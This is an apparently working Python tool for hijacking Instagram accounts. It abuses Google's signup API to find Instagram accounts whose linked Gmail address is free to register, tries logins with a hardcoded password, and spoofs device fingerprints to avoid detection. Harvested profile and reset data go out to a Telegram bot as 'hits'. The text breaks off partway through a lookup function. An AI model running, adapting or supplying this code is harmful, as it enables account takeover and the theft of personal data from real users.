import os
try:
  import requests
  import base64
  from uuid import uuid4
  import random
  from ms4 import InfoIG, RestInsta
  import requests
  import time
  import hashlib
  import uuid
  import json
  from secrets import token_hex
  from ms4 import Instagram
  import pycountry
  import random
  import mechanize
  from bs4 import BeautifulSoup
  from user_agent import generate_user_agent
except:
  os.system("pip install ms4 mechanize bs4 uuid requests faker user_agent pycountry")

import string
import json
from ms4 import UserAgentGenerator
import requests
import base64
from uuid import uuid4
import random
from ms4 import InfoIG, RestInsta
import requests
import time
import hashlib
import uuid
from secrets import token_hex
import pycountry
import random
import mechanize
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import threading
import requests
import random
import requests
import os
import uuid
from secrets import token_hex
import time
from user_agent import generate_user_agent  
from ms4 import Instagram
from requests import get,post
from random import choice,randrange
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import random
import os,requests,sys,time,datetime



E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # red
X = '\033[1;33m'  # yellow
Z1 = '\033[2;31m'  # gray
F = '\033[2;32m'  # green
A = '\033[2;34m'  # blue
C = '\033[2;35m'  # rosy
B = '\x1b[38;5;208m'  # orange
Y = '\033[1;34m'  # light blue
M = '\x1b[1;37m'  # white
S = '\033[1;33m' # brown
U = '\x1b[1;37m'  # sky blue


print(f'''{B}{E}=============================={B}
|{F}[+] Instagram    : {B} Bl4ck_Ch4tan
|{F}[+] TeleGram  : {B} TEAM_Black0
{E}==============================''')

token = input(f' {F}({C}1{F}) {Y} TOKEN {F}  ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} TELEGRAM ID {F}  ' + Z)
print(X + ' ═════════════════════════════════  ')

hit = 0
gg = 0
bb = 0
go = 0
bm = 0


def PLAY():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] CHETAN : @Bl4ck_Ch4tan | @TEAM_BL4CK | Instagram Tool
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -     » 「{hit}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{B} [2] {B} {B} Available IG -    » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [3] {Z} {Z}BAD IG -   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [4] {A} {A}Good GM -  » 「{go}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [5] {X} {X}BAD -    » 「{bm}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [6] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')



def tlg(email):
    global hit
    user = email.split("@")[0]
    hit += 1
    try:
        rest = RestInsta.Rest(user)["email"]
    except:
        rest = "Nothing To Rest"

    inf = InfoIG.Instagram_Info(user)
    name = inf["Name"]
    Id = inf["ID"]
    fols = inf["Followers"]
    folg = inf["Following"]
    bio = inf["Bio"]
    po = inf["Posts"]
    pr = inf["Is Private"]   
    try:
      date = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()['date']
    except:
      date = None
    
    
    tlg = f'''
⋘─────━*arman*━─────⋙
[📩] 𝖊𝖒𝖆𝖎𝖑 ==> {email}
[📭] 𝖊𝖒𝖆𝖎𝖑 𝖗𝖊𝖘𝖊𝖙 ==> {rest}
[👮‍♂️] 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 ==> @{user}
[🕵️‍♀️] 𝖓𝖆𝖒𝖊 ==> {name}
[🧾] 𝖎𝖉 ==> {Id}
[🎎] 𝕱𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 ==> {fols}
[👨🏻‍🤝‍👨🏻] 𝕱𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 ==> {folg}
[👨‍🔬] 𝕭𝖎𝖔 ==> {bio}
[📅] 𝖉𝖆𝖙𝖊 ==> {date}
[🖼] 𝖕𝖔𝖘𝖙 ==> {po}
[🔏] 𝕻𝖗𝖎𝖛𝖆𝖙𝖊 ==> {pr}
[🔗] 𝖀𝕽𝕷 ==> https://www.instagram.com/{user}
⋘─────━arman━─────⋙
𝐁𝐘 : @arman_olds
'''
    print(F + tlg)
    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")

    with open('hits.txt', 'a') as f:
        f.write(tlg + '\n')



def get_tokens():
      while True:
        try:
          g=gg00()['tokens']
          TL=g['TL']
          __Host_GAPS=g['__Host-GAPS']
          at=g['at']
          hl=g['hl']
          s1=g['s1']
          try:
            os.remove(f'tokens.txt')
          except:''
          with open(f'tokens.txt','a') as a:
            a.write(f'{TL}///{__Host_GAPS}///{at}///{hl}///{s1}')
          return False
        except Exception as e:
            print(e)
        
def gg00():
        ua=str(generate_user_agent())
        time0=time.time()
        conn = http.client.HTTPSConnection('accounts.google.com')
        while True:
            try:
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
    }
                conn.request(
        'GET',
        '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
        headers=headers
    )
                response = conn.getresponse().info()
                __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
                tl=str(response).split('TL=')[1].split('\n')[0]
                break
            except Exception as e:''
        while True:
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent':  ua,
    }
                response = requests.get(
        'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
        cookies=cookies,
        headers=headers,
    )
                tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
                hl=tok[0]
                s1=tok[28]
                at=tok[33]
                break
            except Exception as e:''
        while True:
            try:
                name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': hl,
        'TL': tl,
    }
                data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        while True:
            try:
                yaer=str(randrange(1980,2007))
                month=str(randrange(1,12))
                day=str(randrange(1,28))
                cookies = {
        '__Host-GAPS': __Host_GAPS
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': hl,
        'TL': tl,
    }

                data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQbuiwLQLEbJLFMSlolNVvrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwiGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZRdDgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxo3Gdlx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHj4LTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        tm=time.time()
        try:
            return {
                'tokens':{
                    '__Host-GAPS':__Host_GAPS,
                    'TL':tl,
                    'hl':hl,
                    'at':at,
                    's1':s1,
                },
                'info':{
                    'name':name,
                    'birthday':{
                        'day:month:year':day+':'+month+':'+yaer,
                        'day':day,
                        'month':month,
                        'year':yaer,
                    },
                    'time_get_tokens':tm,
                    'time':time.time(),               
                        },
                'errors':[],
            }
        except:
            return {
                'errors':['error get tokens'],
                'tokens':{

                },
                'info':{
                    'time':time.time(),
                    'time_get_tokens':tm,
                },
            }
            
def check_tokens():
      while True:
        try:
          try:
            o=open('tokens.txt','r').read().splitlines()[0].split('///')
            TL=o[0]
            __Host_GAPS=o[1]
            at=o[2]
            hl=o[3]
            s1=o[4]
          except Exception as e:
            get_tokens()
            return
          email=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn1234567890.') for i in range(randrange(10,15)))
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:           
            return True
          else:                        
            get_tokens()
            return False
                    
        except Exception as e:
            get_tokens()

def check_gmail(email):
    global go, bm
    while True:
        try:
          if '@' in email:name=email.split('@')[0]
          check_tokens()
          o=open('tokens.txt','r').read().splitlines()[0].split('///')
          TL=o[0]
          __Host_GAPS=o[1]
          at=o[2]
          hl=o[3]
          s1=o[4]
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            go += 1
            PLAY()            
            tlg(email)
            break
          else:
            bm += 1
            PLAY()
            break
        except Exception as e:
            get_tokens()
     

class Agent:
    @staticmethod
    def user():
        ii = ["165.1.0.29.119", "166.0.0.30.120", "167.0.0.31.121", "168.0.0.32.122"]
        aa = {
            "28/9": ["720dpi", "1080dpi", "1440dpi"],
            "29/10": ["720dpi", "1080dpi", "1440dpi", "2160dpi"],
            "30/11": ["1080dpi", "1440dpi", "2160dpi"],
            "31/12": ["1440dpi", "2160dpi"]
        }
        ss = {
            "720dpi": ["1280x720", "1920x1080"],
            "1080dpi": ["1920x1080", "2560x1440", "3840x2160"],
            "1440dpi": ["2560x1440", "3840x2160"],
            "2160dpi": ["3840x2160", "7680x4320"]
        }
        dd = {
            "samsung": ["SM-T292", "SM-G973F", "SM-A515F"],
            "google": ["Pixel 4", "Pixel 5"],
            "huawei": ["P30 Pro", "Mate 40 Pro"],
            "xiaomi": ["Mi 10", "Redmi Note 10"],
            "oneplus": ["8T", "9 Pro"],
            "sony": ["XZ2", "Xperia 1"]
        }
        cc = ["qcom", "exynos", "kirin", "mediatek", "apple"]
        lan = ["en_US", "es_ES", "fr_FR", "de_DE", "zh_CN", "ja_JP", "ko_KR"]
        dp = ["phone", "tablet", "watch", "tv", "car"]
        arm = ["arm64_v8a", "armeabi-v7a", "x86", "x86_64"]
        comb = ["samsung", "google", "huawei", "xiaomi", "oneplus", "sony"]

        sos = random.choice(list(aa.keys()))
        vlo = random.choice(aa[sos])
        lop = random.choice(ss[vlo])
        ki = random.choice(comb)
        mo = random.choice(dd.get(ki, ["Unknown"]))

        user_agent = (
            f"Instagram {random.choice(ii)} Android "
            f"({sos}; {vlo}; {lop}; {ki}; {mo}; "
            f"{random.choice(arm)}; {random.choice(dp)}; "
            f"{random.choice(lan)}; {random.choice(cc)})"
        )

        return user_agent
        
        
class Variable:
    country = [country.numeric for country in pycountry.countries]
    num = random.choice(country)
    sgin = hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest()
    csr = str(token_hex(8) * 2)
    android = f"android-{uuid.uuid4().hex[:16]}"



def AKM(email):
    global gg, bb
    try:
      IG = Instagram.CheckInsta(email)['Is_Available']
      if IG == 'true':
          gg += 1
          check_gmail(email)
      else:
          bb += 1
    except:
        bb += 1
        pass

def Login(email):
    global gg, bb
    tim = str(int(time.time()))
    psw = "qweaszxpo9999##$$"
    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/"

    payload = "params=%7B%22client_input_params%22%3A%7B%22should_show_nested_nta_from_aymh%22%3A0%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22sim_phones%22%3A%5B%5D%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22Zt4loQABAAFzGR1YLL2M9XOkL9El%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22has_whatsapp_installed%22%3A1%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A1%3A"+tim+"%3A"+psw+"%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22"+email+"%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22should_trigger_override_login_success_action%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%226947f919-c7d1-471a-b1b6-56bbd1e5e844%22%2C%22login_source%22%3A%22Login%22%2C%22is_platform_login%22%3A0%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22is_from_landing_page%22%3A0%2C%22password_text_input_id%22%3A%225ea5qa%3A135%22%2C%22is_from_empty_password%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22username_text_input_id%22%3A%225ea5qa%3A134%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A3.2631949000395E13%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A1%2C%22credential_type%22%3A%22password%22%2C%22is_from_password_entry_page%22%3A0%2C%22caller%22%3A%22gslr%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%2Cdefault%22%2C%22is_from_assistive_id%22%3A0%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb"

    headers = {
  'User-Agent': Agent.user(),
  #'Accept-Encoding': "zstd, gzip, deflate",
  'x-ig-app-locale': "en-US",
  'x-ig-device-locale': "en-US",
  'x-ig-mapped-locale': "en-US",
  'x-pigeon-session-id': "UFS-e075495d-6e46-4687-a0ac-3fb1210b71be-0",
  'x-pigeon-rawclienttime': "1725834678.526",
  'x-ig-bandwidth-speed-kbps': "-1.000",
  'x-ig-bandwidth-totalbytes-b': "0",
  'x-ig-bandwidth-totaltime-ms': "0",
  'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
  'x-ig-www-claim': "0",
  'x-bloks-is-layout-rtl': "true",
  'x-ig-device-id': "8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9",
  'x-ig-family-device-id': "2586e714-fdb4-4741-ba7b-0b84b13e2a97",
  'x-ig-android-id': "android-bf1b282ab2b0b445",
  'x-ig-timezone-offset': "10800",
  'x-fb-connection-type': "MOBILE.LTE",
  'x-ig-connection-type': "MOBILE(LTE)",
  'x-ig-capabilities': "3brTv10=",
  'x-ig-app-id': "567067343352427",
  'priority': "u=3",
  'accept-language': "en-US",
  'x-mid': "Zt4loQABAAFzGR1YLL2M9XOkL9El",
  'ig-intended-user-id': "0",
  'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
  'x-fb-http-engine': "Liger",
  'x-fb-client-ip': "True",
  'x-fb-server-cluster': "True"
}
    try:
      response = requests.post(url, data=payload, headers=headers).text
      if '"status":"ok"' in response:
        if "The password you entered is incorrect." in response or "Login Error: An unexpected error occurred. Please try logging in again." in response:
            gg += 1
            PLAY()
            check_gmail(email)
        elif "Please wait a few minutes before you try again." in req:
            AKM(email)
        else:
            bb += 1
            PLAY()
      else:
          bb += 1
          PLAY()
          AKM(email)
    except:
        bb += 1
        PLAY()
        AKM(email)


def Ch(email):
    global gg, bb
    url = "https://i.instagram.com/api/v1/users/lookup/"
